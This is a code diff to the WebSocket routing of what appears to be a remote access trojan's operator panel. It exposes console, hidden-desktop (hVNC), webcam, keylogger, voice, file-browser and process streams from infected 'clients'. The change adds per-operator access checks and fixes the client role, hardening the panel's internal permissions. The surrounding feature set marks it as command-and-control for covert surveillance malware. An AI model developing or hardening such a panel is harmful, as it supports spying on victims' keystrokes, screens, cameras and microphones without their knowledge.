@@ -1,6 +1,8 @@
 import { authenticateRequest } from "../../auth";
 import { logger } from "../../logger";
 import { isIpBanned } from "../../db";
+import { canUserAccessClient, canUserAccessFeature } from "../../users";
+import type { FeatureName } from "../../users";
 
 type RequestServer = {
   requestIP: (req: Request) => { address?: string } | null | undefined;
@@ -40,6 +42,20 @@ function isWsRateLimited(ip: string): boolean {
   return false;
 }
 
+function checkOperatorAccess(
+  user: { userId: number; role: string },
+  clientId: string,
+  feature: FeatureName,
+): Response | null {
+  if (!canUserAccessClient(user.userId, user.role as any, clientId)) {
+    return new Response("Forbidden: client access denied", { status: 403 });
+  }
+  if (!canUserAccessFeature(user.userId, user.role as any, feature)) {
+    return new Response("Forbidden: feature access denied", { status: 403 });
+  }
+  return null;
+}
+
 export async function handleWsUpgradeRoutes(
   req: Request,
   url: URL,
@@ -62,9 +78,11 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = consoleWsMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "console");
+    if (denied) return denied;
     const sessionId = crypto.randomUUID();
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "console_viewer", clientId, sessionId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "console_viewer", clientId, sessionId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -77,7 +95,7 @@ export async function handleWsUpgradeRoutes(
       return new Response("Unauthorized", { status: 401 });
     }
     const clientId = wsMatch[1];
-    const role = (url.searchParams.get("role") as any) || "viewer";
+    const role = "client";
     const ip = server.requestIP(req)?.address || "";
     if (ip && isIpBanned(ip)) {
       logger.warn(`[auth] Rejected banned IP ${ip} for client ${clientId}`);
@@ -100,8 +118,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = rdMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "remote_desktop");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "rd_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "rd_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -118,8 +138,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = hvncMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "hvnc");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "hvnc_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "hvnc_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -136,8 +158,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = webcamMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "webcam");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "webcam_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "webcam_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -154,8 +178,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = fbMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "file_browser");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "file_browser_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "file_browser_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -172,8 +198,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = processMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "processes");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "process_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "process_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -190,8 +218,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = keyloggerMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "keylogger");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "keylogger_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "keylogger_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
@@ -208,8 +238,10 @@ export async function handleWsUpgradeRoutes(
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
     const clientId = voiceMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "voice");
+    if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "voice_viewer", clientId, ip, userRole: user.role } })) {
+    if (server.upgrade(req, { data: { role: "voice_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
